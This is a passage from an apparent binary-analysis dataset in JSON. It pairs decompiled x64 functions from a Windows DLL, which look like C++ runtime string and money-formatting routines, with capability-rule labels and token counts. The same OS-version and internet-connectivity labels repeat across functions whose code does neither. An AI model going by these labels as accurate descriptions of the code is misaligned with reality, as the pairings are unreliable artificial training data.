= pcVar15;\n                }\n                if (pcVar9[iVar14] != '\\x7f') {\n                    pcVar9 = &cStack184;\n                    if (0xf < uVar16) {\n                        pcVar9 = pcVar15;\n                    }\n                    pcVar9[iVar14] = pcVar9[iVar14] + '\\x01';\n                    goto code_r0x00018007d2e4;\n                }\n            }\n            else {\n                pcVar9 = &cStack184;\n                if (0xf < uVar16) {\n                    pcVar9 = pcVar15;\n                }\n                if (((pcVar9[iVar14] == '\\0') || (iVar6 == 0)) || (iVar7 = fcn.1800783e4(arg3),  iVar7 != iVar6)) break;\n                if (uStack168 < uVar16) {\n                    pcVar9 = &cStack184;\n                    if (0xf < uVar16) {\n                        pcVar9 = pcVar15;\n                    }\n                    puVar1 = pcVar9 + uStack168;\n                    uStack168 = uStack168 + 1;\n                    *puVar1 = 0;\n                }\n                else {\n                    fcn.180013eb0(&cStack184, 1);\n                }\n                iVar14 = iVar14 + 1;\ncode_r0x00018007d2e4:\n                pcVar15 = CONCAT62(Stack182, CONCAT11(uStack183, cStack184));\n                uVar16 = uStack160;\n            }\n            fcn.18007f190(arg3);\n            cVar4 = fcn.1800890e8(arg3, uStack216);\n        } while (cVar4 == '\\0');\n        arg2 = pcStack200;\n        cVar4 = cStack232;\n        if (iVar14 != 0) {\n            pcVar9 = &cStack184;\n            if (0xf < uVar16) {\n                pcVar9 = pcVar15;\n            }\n            if (pcVar9[iVar14] < '\\x01') {\n                cVar4 = '\\0';\n            }\n            else {\n                iVar14 = iVar14 + 1;\n            }\n        }\n    }\n    ppppuVar13 = appppuStack152;\n    if (0xf < uStack128) {\n        ppppuVar13 = appppuStack152[0];\n    }\n    if (cVar4 != '\\0') {\n        while ((iVar14 != 0 && (cVar4 = *ppppuVar13,  cVar4 != '\\x7f'))) {\n            iVar14 = iVar14 + -1;\n            if (iVar14 != 0) {\n                pcVar9 = &cStack184;\n                if (0xf < uVar16) {\n                    pcVar9 = pcVar15;\n                }\n                if (cVar4 != pcVar9[iVar14]) goto code_r0x00018007d3ac;\n            }\n            if (iVar14 == 0) {\n                pcVar9 = &cStack184;\n                if (0xf < uVar16) {\n                    pcVar9 = pcVar15;\n                }\n                if (cVar4 < *pcVar9) goto code_r0x00018007d3ac;\n            }\n            if ('\\0' < *(ppppuVar13 + 1)) {\n                ppppuVar13 = ppppuVar13 + 1;\n            }\n        }\n        arg2 = pcVar17;\n        if (cStack231 == '\\0') {\n            *pcVar17 = '0';\n            arg2 = pcVar17 + 1;\n        }\n    }\ncode_r0x00018007d3ac:\n    *arg2 = '\\0';\n    if (0xf < uVar16) {\n        pcVar17 = pcVar15;\n        if ((0xfff < uVar16 + 1) && (pcVar17 = *(pcVar15 + -8),  0x1f < pcVar15 + (-8 - pcVar17)))\n        goto code_r0x00018007d44b;\n        fcn.18008fb24(pcVar17);\n    }\n    if (0xf < uStack128) {\n        ppppuVar13 = appppuStack152[0];\n        if (0xfff < uStack128 + 1) {\n            ppppuVar13 = appppuStack152[0][-1];\n            if (0x1f < appppuStack152[0] + (-8 - ppppuVar13)) {\n                fcn.1800b3528(ppppuVar13, uStack128 + 0x28);\ncode_r0x00018007d44b:\n                fcn.1800b3528();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(ppppuVar13);\n    }\n    fcn.18008fb00(uStack64 ^ auStack280);\n    return;\n}\n",
        "token_count": 2612
    },
    "18007f10": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18007f108(int64_t arg1, ulong noname_1, int64_t arg3)\n\n{\n    ulong uVar1;\n    \n    if (*(arg1 + 0x44) == '\\0') {\n        uVar1 = *(arg3 + 0x70);\n    }\n    else {\n        uVar1 = *(arg3 + 0x68);\n    }\n    uVar1 = fcn.180081b30(uVar1);\n    *(arg1 + 0x20) = uVar1;\n    uVar1 = 0x1800e2b9c;\n    if (*(arg3 + 0x56) < 5) {\n        uVar1 = *(arg3 + 0x88);\n    }\n    uVar1 = fcn.180081b30(uVar1);\n    *(arg1 + 0x28) = uVar1;\n    uVar1 = 0x1800e2ba0;\n    if (*(arg3 + 0x57) < 5) {\n        uVar1 = *(arg3 + 0x90);\n    }\n    uVar1 = fcn.180081b30(uVar1);\n    *(arg1 + 0x30) = uVar1;\n    *(arg1 + 0x18) = **(arg3 + 0x78);\n    *(arg1 + 0x1a) = **(arg3 + 0x80);\n    return;\n}\n",
        "token_count": 321
    },
    "180081b9": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180081b9c(ulong noname_0, uint *arg2, uchar (*arg3) [16])\n\n{\n    char cVar1;\n    code *pcVar2;\n    bool bVar3;\n    uint32_t uVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    char *pcVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    char in_R9B;\n    uint64_t uVar12;\n    int64_t in_stack_00000028;\n    char in_stack_00000038;\n    int64_t in_stack_00000040;\n    uchar auStack312 [36];\n    char acStack276 [8];\n    uint32_t uStack268;\n    uint32_t uStack264;\n    uchar (*pauStack256) [16];\n    int64_t iStack248;\n    int64_t iStack240;\n    uint *puStack232;\n    ulong uStack224;\n    uchar auStack200 [8];\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint64_t uStack152;\n    ulong uStack144;\n    char cStack136;\n    unkbyte7 Stack135;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    int64_t iStack88;\n    ulong uStack80;\n    uint64_t uStack72;\n    \n    uStack224 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack312;\n    iStack240 = in_stack_00000028;\n    iStack248 = in_stack_00000040;\n    iVar6 = *(*(in_stack_00000028 + 0x40) + 8);\n    _auStack200 = CONCAT88(iVar6, auStack200);\n    pauStack256 = arg3;\n    puStack232 = arg2;\n    if (in_R9B == '\\0') {\n        (**0x1800de8f0)(iVar6);\n        uVar5 = fcn.1800772d0(auStack200);\n    }\n    else {\n        (**0x1800de8f0)();\n        uVar5 = fcn.18007719c(auStack200);\n    }\n    if ((iVar6 != 0) && (iVar6 = (**0x1800de8f0)(iVar6),  iVar6 != 0)) {\n        (**0x1800de8f0)(iVar6, 1);\n    }\n    (**0x1800de8f0)(uVar5);\n    uVar4 = (**0x1800de8f0)(uVar5);\n    uVar4 = (uVar4 ^ uVar4 >> 0x1f) - (uVar4 >> 0x1f);\n    uVar12 = uVar4;\n    uStack264 = uVar4;\n    if (*(in_stack_00000040 + 0x10) < uVar12 || *(in_stack_00000040 + 0x10) == uVar12) {\n        fcn.1800891dc(in_stack_00000040, 0, (uVar12 - *(in_stack_00000040 + 0x10)) + 1);\n    }\n    else {\n        pcVar7 = &cStack136;\n        if (0xf < CONCAT44(uStack108, uStack112)) {\n            pcVar7 = CONCAT71(Stack135, cStack136);\n        }\n        if (*pcVar7 != '\\x7f') {\n            pcVar7 = &cStack136;\n            if (0xf < CONCAT44(uStack108, uStack112)) {\n                pcVar7 = CONCAT71(Stack135, cStack136);\n            }\n            if ('\\0' < *pcVar7) {\n                (**0x1800de8f0)();\n                pcVar7 = &cStack136;\n                if (0xf < CONCAT44(uStack108, uStack112)) {\n                    pcVar7 = CONCAT71(Stack135, cStack136);\n                }\n                uVar10 = *(in_stack_00000040 + 0x10) - uVar12;\n                cVar1 = *pcVar7;\n                uVar4 = uStack264;\n                in_stack_00000028 = iStack240;\n                while (uStack264 = uVar4,  iStack240 = in_stack_00000028,  cVar1 != '\\x7f') {\n                    uStack104._2_2_ = uStack104 >> 0x10;\n                    uStack168._2_2_ = uStack168 >> 0x10;\n                    arg3 = pauStack256;\n                    if ((cVar1 < '\\x01') || (uVar10 <= cVar1)) break;\n                    uVar10 = uVar10 - cVar1;\n                    fcn.1800891dc(in_stack_00000040, uVar10, 1);\n                    if ('\\0' < pcVar7[1]) {\n                        pcVar7 = pcVar7 + 1;\n                    }\n                    arg3 = pauStack256;\n                    uVar4 = uStack264;\n                    in_stack_00000028 = iStack240;\n                    cVar1 = *pcVar7;\n                }\n            }\n        }\n    }\n    uStack152 = 0;\n    uStack144 = 7;\n    uStack168 = uStack168._2_2_ << 0x10;\n    if (in_stack_00000038 == '\\0') {\n        (**0x1800de8f0)(uVar5, acStack276);\n    }\n    else {\n        (**0x1800de8f0)();\n    }\n    (**0x1800de8f0)(uVar5, auStack200);\n    fcn.180003e40(&uStack168);\n    uStack168 = auStack200._0_4_;\n    uStack164 = auStack200._4_4_;\n    uStack160 = uStack192;\n    uStack156 = uStack188;\n    uStack152 = CONCAT44(uStack180, uStack184);\n    uStack184 = *0x180101900;\n    uStack180 = *0x180101904;\n    uStack176 = *0x180101908;\n    uStack172 = *0x18010190c;\n    _auStack200 = _auStack200 & 0xffffffffffff0000;\n    fcn.180003e40(auStack200);\n    iStack88 = 0;\n    uStack80 = 7;\n    uStack104 = uStack104._2_2_ << 0x10;\n    if ((*(in_stack_00000028 + 0x18) & 8) != 0) {\n        (**0x1800de8f0)(uVar5, auStack200);\n        fcn.180003e40(&uStack104);\n        uStack104 = auStack200._0_4_;\n        uStack100 = auStack200._4_4_;\n        uStack96 = uStack192;\n        uStack92 = uStack188;\n        iStack88 = CONCAT44(uStack180, uStack184);\n        uStack80 = CONCAT44(uStack172, uStack176);\n        uStack184 = *0x180101900;\n        uStack180 = *0x180101904;\n        uStack176 = *0x180101908;\n        uStack172 = *0x18010190c;\n        _auStack200 = _auStack200 & 0xffffffffffff0000;\n        fcn.180003e40(auStack200);\n    }\n    uVar10 = 0;\n    bVar3 = false;\n    uVar11 = uVar10;\n    uVar8 = uVar10;\n    do {\n        cVar1 = acStack276[uVar8];\n        if (cVar1 == ' ') {\n            uVar11 = uVar11 + 1;\ncode_r0x000180081ed2:\n            if (uVar8 != 3) {\n                bVar3 = true;\n            }\n        }\n        else if (cVar1 == '$') {\n            uVar11 = uVar11 + iStack88;\n        }\n        else if (cVar1 == '+') {\n            uVar11 = uVar11 + uStack152;\n        }\n        else if (cVar1 == 'v') {\n            iVar6 = uVar12 + 1;\n            if (uVar12 <= *(in_stack_00000040 + 0x10) && *(in_stack_00000040 + 0x10) != uVar12) {\n                iVar6 = *(in_stack_00000040 + 0x10);\n            }\n            uVar11 = uVar11 + (uVar4 != 0) + iVar6;\n        }\n        else if (cVar1 == 'x') goto code_r0x000180081ed2;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 4);\n    uVar12 = *(in_stack_00000028 + 0x28);\n    if ((0 < uVar12) && (uVar11 < uVar12)) {\n        uVar10 = uVar12 - uVar11;\n    }\n    uVar4 = *(in_stack_00000028 + 0x18) & 0x1c0;\n    uStack268 = uVar4;\n    if ((uVar4 != 0x40) && ((uVar4 != 0x100 || (!bVar3)))) {\n        _auStack200 = *arg3;\n        for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n            fcn.180078370(auStack200);\n            in_stack_00000040 = iStack248;\n        }\n        uVar10 = 0;\n        *arg3 = _auStack200;\n    }\n    uVar12 = 0;\n    do {\n        cVar1 = acStack276[uVar12];\n        if (cVar1 == ' ') {\n            _auStack200 = *arg3;\n            fcn.180078370(auStack200);\n            *arg3 = _auStack200;\ncode_r0x000180081f8f:\n            if (uVar4 != 0x100) goto code_r0x000180081fd0;\n            _auStack200 = *arg3;\n            for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n                fcn.180078370(auStack200);\n                uVar4 = uStack268;\n            }\n            uVar10 = 0;\ncode_r0x000180081fcb:\n            *arg3 = _auStack200;\n        }\n        else {\n            if (cVar1 == '$') {\n                _auStack200 = *arg3;\n                for (iVar6 = iStack88; uVar4 = uStack268,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                    fcn.180078370(auStack200);\n                    arg3 = pauStack256;\n                    in_stack_00000040 = iStack248;\n                }\n                goto code_r0x000180081fcb;\n            }\n            if (cVar1 == '+') {\n                if (uStack152 != 0) {\n                    _auStack200 = *arg3;\n                    fcn.180078370(auStack200);\n                    goto code_r0x000180081fcb;\n                }\n            }\n            else {\n                if (cVar1 == 'v') {\n                    uVar11 = *(in_stack_00000040 + 0x10);\n                    uVar8 = uStack264;\n                    if (uStack264 == 0) {\n                        _auStack200 = *arg3;\n                        for (; uVar4 = uStack268,  uVar11 != 0; uVar11 = uVar11 - 1) {\n                            fcn.180078370(auStack200);\n                            arg3 = pauStack256;\n                            in_stack_00000040 = iStack248;\n                        }\n                    }\n                    else if (uVar8 < uVar11) {\n                        iVar6 = uVar11 - uVar8;\n                        auStack200._0_4_ = **arg3;\n                        auStack200._4_4_ = *(*arg3 + 4);\n                        uStack192 = *(*arg3 + 8);\n                        uStack188 = *(*arg3 + 0xc);\n                        _auStack200 = *arg3;\n                        if (iVar6 != 0) {\n                            do {\n                                fcn.180078370(auStack200);\n                                iVar6 = iVar6 + -1;\n                            } while (iVar6 != 0);\n                            arg3 = pauStack256;\n                            in_stack_00000040 = iStack248;\n                        }\n                        **arg3 = auStack200._0_4_;\n                        *(*arg3 + 4) = auStack200._4_4_;\n                        *(*arg3 + 8) = uStack192;\n                        *(*arg3 + 0xc) = uStack188;\n                        (**0x1800de8f0)(uVar5);\n                        fcn.180078370(arg3);\n                        uVar11 = uStack264;\n                        _auStack200 = *arg3;\n                        uVar4 = uStack268;\n                        if (uStack264 != 0) {\n                            do {\n                                fcn.180078370(auStack200);\n                                uVar11 = uVar11 - 1;\n                                arg3 = pauStack256;\n                                in_stack_00000040 = iStack248;\n                                uVar4 = uStack268;\n                            } while (uVar11 != 0);\n                        }\n                    }\n                    else {\n                        fcn.180078370(arg3);\n                        (**0x1800de8f0)(uVar5);\n                        fcn.180078370(arg3);\n                        iVar6 = *(in_stack_00000040 + 0x10);\n                        _auStack200 = *arg3;\n                        iVar9 = uVar8 - iVar6;\n                        in_stack_00000040 = in_stack_00000040;\n                        if (iVar9 != 0) {\n                            do {\n                                fcn.180078370(auStack200);\n                                iVar9 = iVar9 + -1;\n                            } while (iVar9 != 0);\n                            iVar6 = *(iStack248 + 0x10);\n                            arg3 = pauStack256;\n                            in_stack_00000040 = iStack248;\n                        }\n                        for (; uVar4 = uStack268,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                            fcn.180078370(auStack200);\n                            arg3 = pauStack256;\n                            in_stack_00000040 = iStack248;\n                        }\n                    }\n                    goto code_r0x000180081fcb;\n                }\n                if (cVar1 == 'x') goto code_r0x000180081f8f;\n            }\n        }\ncode_r0x000180081fd0:\n        uVar12 = uVar12 + 1;\n        if (3 < uVar12) {\n            if (1 < uStack152) {\n                auStack200._0_4_ = **arg3;\n                auStack200._4_4_ = *(*arg3 + 4);\n                uStack192 = *(*arg3 + 8);\n                uStack188 = *(*arg3 + 0xc);\n                _auStack200 = *arg3;\n                iVar6 = uStack152 - 1;\n                if (iVar6 != 0) {\n                    do {\n                        fcn.180078370(auStack200);\n                        iVar6 = iVar6 + -1;\n                    } while (iVar6 != 0);\n                }\n                **arg3 = auStack200._0_4_;\n                *(*arg3 + 4) = auStack200._4_4_;\n                *(*arg3 + 8) = uStack192;\n                *(*arg3 + 0xc) = uStack188;\n            }\n            *(iStack240 + 0x28) = 0;\n            auStack200._0_4_ = **arg3;\n            auStack200._4_4_ = *(*arg3 + 4);\n            uStack192 = *(*arg3 + 8);\n            uStack188 = *(*arg3 + 0xc);\n            _auStack200 = *arg3;\n            if (uVar10 != 0) {\n                do {\n                    fcn.180078370(auStack200);\n                    uVar10 = uVar10 - 1;\n                } while (uVar10 != 0);\n            }\n            *puStack232 = auStack200._0_4_;\n            puStack232[1] = auStack200._4_4_;\n            puStack232[2] = uStack192;\n            puStack232[3] = uStack188;\n            fcn.180003e40(&uStack104);\n            fcn.180003e40(&uStack168);\n            uVar12 = CONCAT44(uStack108, uStack112);\n            if (0xf < uVar12) {\n                iVar9 = CONCAT71(Stack135, cStack136);\n                iVar6 = iVar9;\n                if (0xfff < uVar12 + 1) {\n                    iVar6 = *(iVar9 + -8);\n                    if (0x1f < (iVar9 - iVar6) - 8U) {\n                        fcn.1800b3528(iVar6, uVar12 + 0x28);\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(iVar6);\n            }\n            uStack120 = *0x180101910;\n            uStack116 = *0x180101914;\n            uStack112 = *0x180101918;\n            uStack108 = *0x18010191c;\n            cStack136 = '\\0';\n            fcn.180003e40(in_stack_00000040);\n            fcn.18008fb00(uStack72 ^ auStack312);\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 4036
    },
    "18008238": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180082380(ulong noname_0, uint *arg2, uchar (*arg3) [16])\n\n{\n    char cVar1;\n    code *pcVar2;\n    bool bVar3;\n    uint32_t uVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    char *pcVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    char in_R9B;\n    uint64_t uVar12;\n    int64_t in_stack_00000028;\n    char in_stack_00000038;\n    int64_t in_stack_00000040;\n    uchar auStack312 [36];\n    char acStack276 [8];\n    uint32_t uStack268;\n    uint32_t uStack264;\n    uchar (*pauStack256) [16];\n    int64_t iStack248;\n    int64_t iStack240;\n    uint *puStack232;\n    ulong uStack224;\n    uchar auStack200 [8];\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint64_t uStack152;\n    ulong uStack144;\n    char cStack136;\n    unkbyte7 Stack135;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    int64_t iStack88;\n    ulong uStack80;\n    uint64_t uStack72;\n    \n    uStack224 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack312;\n    iStack240 = in_stack_00000028;\n    iStack248 = in_stack_00000040;\n    iVar6 = *(*(in_stack_00000028 + 0x40) + 8);\n    _auStack200 = CONCAT88(iVar6, auStack200);\n    pauStack256 = arg3;\n    puStack232 = arg2;\n    if (in_R9B == '\\0') {\n        (**0x1800de8f0)(iVar6);\n        uVar5 = fcn.180077538(auStack200);\n    }\n    else {\n        (**0x1800de8f0)();\n        uVar5 = fcn.180077404(auStack200);\n    }\n    if ((iVar6 != 0) && (iVar6 = (**0x1800de8f0)(iVar6),  iVar6 != 0)) {\n        (**0x1800de8f0)(iVar6, 1);\n    }\n    (**0x1800de8f0)(uVar5);\n    uVar4 = (**0x1800de8f0)(uVar5);\n    uVar4 = (uVar4 ^ uVar4 >> 0x1f) - (uVar4 >> 0x1f);\n    uVar12 = uVar4;\n    uStack264 = uVar4;\n    if (*(in_stack_00000040 + 0x10) < uVar12 || *(in_stack_00000040 + 0x10) == uVar12) {\n        fcn.180089288(in_stack_00000040, 0, (uVar12 - *(in_stack_00000040 + 0x10)) + 1);\n    }\n    else {\n        pcVar7 = &cStack136;\n        if (0xf < CONCAT44(uStack108, uStack112)) {\n            pcVar7 = CONCAT71(Stack135, cStack136);\n        }\n        if (*pcVar7 != '\\x7f') {\n            pcVar7 = &cStack136;\n            if (0xf < CONCAT44(uStack108, uStack112)) {\n                pcVar7 = CONCAT71(Stack135, cStack136);\n            }\n            if ('\\0' < *pcVar7) {\n                (**0x1800de8f0)();\n                pcVar7 = &cStack136;\n                if (0xf < CONCAT44(uStack108, uStack112)) {\n                    pcVar7 = CONCAT71(Stack135, cStack136);\n                }\n                uVar10 = *(in_stack_00000040 + 0x10) - uVar12;\n                cVar1 = *pcVar7;\n                uVar4 = uStack264;\n                in_stack_00000028 = iStack240;\n                while (uStack264 = uVar4,  iStack240 = in_stack_00000028,  cVar1 != '\\x7f') {\n                    uStack104._2_2_ = uStack104 >> 0x10;\n                    uStack168._2_2_ = uStack168 >> 0x10;\n                    arg3 = pauStack256;\n                    if ((cVar1 < '\\x01') || (uVar10 <= cVar1)) break;\n                    uVar10 = uVar10 - cVar1;\n                    fcn.180089288(in_stack_00000040, uVar10, 1);\n                    if ('\\0' < pcVar7[1]) {\n                        pcVar7 = pcVar7 + 1;\n                    }\n                    arg3 = pauStack256;\n                    uVar4 = uStack264;\n                    in_stack_00000028 = iStack240;\n                    cVar1 = *pcVar7;\n                }\n            }\n        }\n    }\n    uStack152 = 0;\n    uStack144 = 7;\n    uStack168 = uStack168._2_2_ << 0x10;\n    if (in_stack_00000038 == '\\0') {\n        (**0x1800de8f0)(uVar5, acStack276);\n    }\n    else {\n        (**0x1800de8f0)();\n    }\n    (**0x1800de8f0)(uVar5, auStack200);\n    fcn.180003e40(&uStack168);\n    uStack168 = auStack200._0_4_;\n    uStack164 = auStack200._4_4_;\n    uStack160 = uStack192;\n    uStack156 = uStack188;\n    uStack152 = CONCAT44(uStack180, uStack184);\n    uStack184 = *0x180101900;\n    uStack180 = *0x180101904;\n    uStack176 = *0x180101908;\n    uStack172 = *0x18010190c;\n    _auStack200 = _auStack200 & 0xffffffffffff0000;\n    fcn.180003e40(auStack200);\n    iStack88 = 0;\n    uStack80 = 7;\n    uStack104 = uStack104._2_2_ << 0x10;\n    if ((*(in_stack_00000028 + 0x18) & 8) != 0) {\n        (**0x1800de8f0)(uVar5, auStack200);\n        fcn.180003e40(&uStack104);\n        uStack104 = auStack200._0_4_;\n        uStack100 = auStack200._4_4_;\n        uStack96 = uStack192;\n        uStack92 = uStack188;\n        iStack88 = CONCAT44(uStack180, uStack184);\n        uStack80 = CONCAT44(uStack172, uStack176);\n        uStack184 = *0x180101900;\n        uStack180 = *0x180101904;\n        uStack176 = *0x180101908;\n        uStack172 = *0x18010190c;\n        _auStack200 = _auStack200 & 0xffffffffffff0000;\n        fcn.180003e40(auStack200);\n    }\n    uVar10 = 0;\n    bVar3 = false;\n    uVar11 = uVar10;\n    uVar8 = uVar10;\n    do {\n        cVar1 = acStack276[uVar8];\n        if (cVar1 == ' ') {\n            uVar11 = uVar11 + 1;\ncode_r0x0001800826b6:\n            if (uVar8 != 3) {\n                bVar3 = true;\n            }\n        }\n        else if (cVar1 == '$') {\n            uVar11 = uVar11 + iStack88;\n        }\n        else if (cVar1 == '+') {\n            uVar11 = uVar11 + uStack152;\n        }\n        else if (cVar1 == 'v') {\n            iVar6 = uVar12 + 1;\n            if (uVar12 <= *(in_stack_00000040 + 0x10) && *(in_stack_00000040 + 0x10) != uVar12) {\n                iVar6 = *(in_stack_00000040 + 0x10);\n            }\n            uVar11 = uVar11 + (uVar4 != 0) + iVar6;\n        }\n        else if (cVar1 == 'x') goto code_r0x0001800826b6;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 4);\n    uVar12 = *(in_stack_00000028 + 0x28);\n    if ((0 < uVar12) && (uVar11 < uVar12)) {\n        uVar10 = uVar12 - uVar11;\n    }\n    uVar4 = *(in_stack_00000028 + 0x18) & 0x1c0;\n    uStack268 = uVar4;\n    if ((uVar4 != 0x40) && ((uVar4 != 0x100 || (!bVar3)))) {\n        _auStack200 = *arg3;\n        for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n            fcn.180078370(auStack200);\n            in_stack_00000040 = iStack248;\n        }\n        uVar10 = 0;\n        *arg3 = _auStack200;\n    }\n    uVar12 = 0;\n    do {\n        cVar1 = acStack276[uVar12];\n        if (cVar1 == ' ') {\n            _auStack200 = *arg3;\n            fcn.180078370(auStack200);\n            *arg3 = _auStack200;\ncode_r0x000180082773:\n            if (uVar4 != 0x100) goto code_r0x0001800827b4;\n            _auStack200 = *arg3;\n            for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n                fcn.180078370(auStack200);\n                uVar4 = uStack268;\n            }\n            uVar10 = 0;\ncode_r0x0001800827af:\n            *arg3 = _auStack200;\n        }\n        else {\n            if (cVar1 == '$') {\n                _auStack200 = *arg3;\n                for (iVar6 = iStack88; uVar4 = uStack268,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                    fcn.180078370(auStack200);\n                    arg3 = pauStack256;\n                    in_stack_00000040 = iStack248;\n                }\n                goto code_r0x0001800827af;\n            }\n            if (cVar1 == '+') {\n                if (uStack152 != 0) {\n                    _auStack200 = *arg3;\n                    fcn.180078370(auStack200);\n                    goto code_r0x0001800827af;\n                }\n            }\n            else {\n                if (cVar1 == 'v') {\n                    uVar11 = *(in_stack_00000040 + 0x10);\n                    uVar8 = uStack264;\n                    if (uStack264 == 0) {\n                        _auStack200 = *arg3;\n                        for (; uVar4 = uStack268,  uVar11 != 0; uVar11 = uVar11 - 1) {\n                            fcn.180078370(auStack200);\n                            arg3 = pauStack256;\n                            in_stack_00000040 = iStack248;\n                        }\n                    }\n                    else if (uVar8 < uVar11) {\n                        iVar6 = uVar11 - uVar8;\n                        auStack200._0_4_ = **arg3;\n                        auStack200._4_4_ = *(*arg3 + 4);\n                        uStack192 = *(*arg3 + 8);\n                        uStack188 = *(*arg3 + 0xc);\n                        _auStack200 = *arg3;\n                        if (iVar6 != 0) {\n                            do {\n                                fcn.180078370(auStack200);\n                                iVar6 = iVar6 + -1;\n                            } while (iVar6 != 0);\n                            arg3 = pauStack256;\n                            in_stack_00000040 = iStack248;\n                        }\n                        **arg3 = auStack200._0_4_;\n                        *(*arg3 + 4) = auStack200._4_4_;\n                        *(*arg3 + 8) = uStack192;\n                        *(*arg3 + 0xc) = uStack188;\n                        (**0x1800de8f0)(uVar5);\n                        fcn.180078370(arg3);\n                        uVar11 = uStack264;\n                        _auStack200 = *arg3;\n                        uVar4 = uStack268;\n                        if (uStack264 != 0) {\n                            do {\n                                fcn.180078370(auStack200);\n                                uVar11 = uVar11 - 1;\n                                arg3 = pauStack256;\n                                in_stack_00000040 = iStack248;\n                                uVar4 = uStack268;\n                            } while (uVar11 != 0);\n                        }\n                    }\n                    else {\n                        fcn.180078370(arg3);\n                        (**0x1800de8f0)(uVar5);\n                        fcn.180078370(arg3);\n                        iVar6 = *(in_stack_00000040 + 0x10);\n                        _auStack200 = *arg3;\n                        iVar9 = uVar8 - iVar6;\n                        in_stack_00000040 = in_stack_00000040;\n                        if (iVar9 != 0) {\n                            do {\n                                fcn.180078370(auStack200);\n                                iVar9 = iVar9 + -1;\n                            } while (iVar9 != 0);\n                            iVar6 = *(iStack248 + 0x10);\n                            arg3 = pauStack256;\n                            in_stack_00000040 = iStack248;\n                        }\n                        for (; uVar4 = uStack268,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                            fcn.180078370(auStack200);\n                            arg3 = pauStack256;\n                            in_stack_00000040 = iStack248;\n                        }\n                    }\n                    goto code_r0x0001800827af;\n                }\n                if (cVar1 == 'x') goto code_r0x000180082773;\n            }\n        }\ncode_r0x0001800827b4:\n        uVar12 = uVar12 + 1;\n        if (3 < uVar12) {\n            if (1 < uStack152) {\n                auStack200._0_4_ = **arg3;\n                auStack200._4_4_ = *(*arg3 + 4);\n                uStack192 = *(*arg3 + 8);\n                uStack188 = *(*arg3 + 0xc);\n                _auStack200 = *arg3;\n                iVar6 = uStack152 - 1;\n                if (iVar6 != 0) {\n                    do {\n                        fcn.180078370(auStack200);\n                        iVar6 = iVar6 + -1;\n                    } while (iVar6 != 0);\n                }\n                **arg3 = auStack200._0_4_;\n                *(*arg3 + 4) = auStack200._4_4_;\n                *(*arg3 + 8) = uStack192;\n                *(*arg3 + 0xc) = uStack188;\n            }\n            *(iStack240 + 0x28) = 0;\n            auStack200._0_4_ = **arg3;\n            auStack200._4_4_ = *(*arg3 + 4);\n            uStack192 = *(*arg3 + 8);\n            uStack188 = *(*arg3 + 0xc);\n            _auStack200 = *arg3;\n            if (uVar10 != 0) {\n                do {\n                    fcn.180078370(auStack200);\n                    uVar10 = uVar10 - 1;\n                } while (uVar10 != 0);\n            }\n            *puStack232 = auStack200._0_4_;\n            puStack232[1] = auStack200._4_4_;\n            puStack232[2] = uStack192;\n            puStack232[3] = uStack188;\n            fcn.180003e40(&uStack104);\n            fcn.180003e40(&uStack168);\n            uVar12 = CONCAT44(uStack108, uStack112);\n            if (0xf < uVar12) {\n                iVar9 = CONCAT71(Stack135, cStack136);\n                iVar6 = iVar9;\n                if (0xfff < uVar12 + 1) {\n                    iVar6 = *(iVar9 + -8);\n                    if (0x1f < (iVar9 - iVar6) - 8U) {\n                        fcn.1800b3528(iVar6, uVar12 + 0x28);\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(iVar6);\n            }\n            uStack120 = *0x180101910;\n            uStack116 = *0x180101914;\n            uStack112 = *0x180101918;\n            uStack108 = *0x18010191c;\n            cStack136 = '\\0';\n            